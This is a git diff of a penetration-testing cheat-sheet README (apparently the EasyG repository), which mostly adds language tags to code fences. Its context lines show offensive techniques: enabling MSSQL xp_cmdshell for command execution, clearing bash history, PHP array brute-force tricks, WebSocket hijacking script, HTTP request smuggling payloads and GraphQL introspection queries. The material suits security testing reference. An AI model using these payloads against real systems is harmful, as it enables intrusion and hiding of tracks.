@@ -177,7 +177,7 @@ EasyG started out as a script that I use to automate some information gathering 
 - [ ] [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html), check also
   - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
   - [OWASP Web Application Penetration Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)
-- [ ] [Look at the index of this repo](#index) and see if you missed anything interesting
+- [ ] [Look at the index of this repo](#index) and see if you've missed anything interesting
 
 ## Content Discovery
 
@@ -610,13 +610,13 @@ ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
   ```
 
 **RCE**
-```sql
+```SQL
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 xp_cmdshell 'COMMAND';
 ```
 
-```
+```SQL
 EXEC sp_configure 'allow updates', 0
 RECONFIGURE
 EXEC sp_configure 'show advanced options', 1
@@ -671,7 +671,7 @@ xp_cmdshell 'COMMAND';
   - Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim
 - PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
 - Replace password with a list of candidates, example
-  ```
+  ```JSON
   "username":"usertest"
   "password":[
    "123456",
@@ -1100,7 +1100,7 @@ Manually testing for XXE vulnerabilities generally involves
 - Use another user's token
 - Change from `POST` to `GET` and delete the token
 - If it's a `PUT` or `DELETE` request, try `POST /profile/update?_method=PUT` or
-  ```
+  ```HTTP
   POST /profile/update HTTP/1.1
   Host: vuln.com
   ...
@@ -1277,7 +1277,7 @@ Any web security vulnerability might arise in relation to WebSockets:
 - If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.
 
 **Cross-site WebSocket hijacking (CSRF missing)**
-```
+```HTML
 <script>
   websocket = new WebSocket('wss://websocket-URL');
   websocket.onopen = start;
@@ -1374,7 +1374,7 @@ curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Refere
 
 Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends:
 - Content-Length
-  ```
+  ```HTTP
   POST /search HTTP/1.1
   Host: normal-website.com
   Content-Type: application/x-www-form-urlencoded
@@ -1382,7 +1382,7 @@ Most HTTP request smuggling vulnerabilities arise because the HTTP specification
   q=smuggling
   ```
 - Transfer-Encoding
-  ```
+  ```HTTP
   POST /search HTTP/1.1
   Host: normal-website.com
   Content-Type: application/x-www-form-urlencoded
@@ -1393,7 +1393,7 @@ Most HTTP request smuggling vulnerabilities arise because the HTTP specification
   ```
   
 Example
-```
+```HTTP
 POST / HTTP/1.1
 Host: smuggle-vulnerable.net
 Connection: keep-alive
@@ -1424,7 +1424,7 @@ Ways to obfuscate the Transfer-Encoding header
   ```
 
 Confirming CL.TE vulnerabilities using differential responses
-```
+```HTTP
 POST /search HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -1442,7 +1442,7 @@ Foo: x
 ```
 
 Result
-```
+```HTTP
 GET /404 HTTP/1.1
 Foo: xPOST /search HTTP/1.1
 Host: vulnerable-website.com
@@ -1459,14 +1459,14 @@ Impact
 - Using HTTP request smuggling to exploit reflected XSS
 - Turn an on-site redirect into an open redirect<br/>
   Example of 301 in Apache and IIS web servers
-  ```
+  ```HTTP
   GET /home HTTP/1.1
   Host: normal-website.com
   HTTP/1.1 301 Moved Permanently
   Location: https://normal-website.com/home/
   ```
   Vulnerable request
-  ```
+  ```HTTP
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 54
@@ -1479,7 +1479,7 @@ Impact
   Foo: X
   ```
   Result
-  ```
+  ```HTTP
   GET /home HTTP/1.1
   Host: attacker-website.com
   Foo: XGET /scripts/include.js HTTP/1.1
@@ -1599,15 +1599,15 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 **GraphQL Introspection query**
 
-```
+```JSON
 {"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
 ```
 
-```
+```JSON
 {query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
 
-```
+```JSON
 {"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
 ```
 
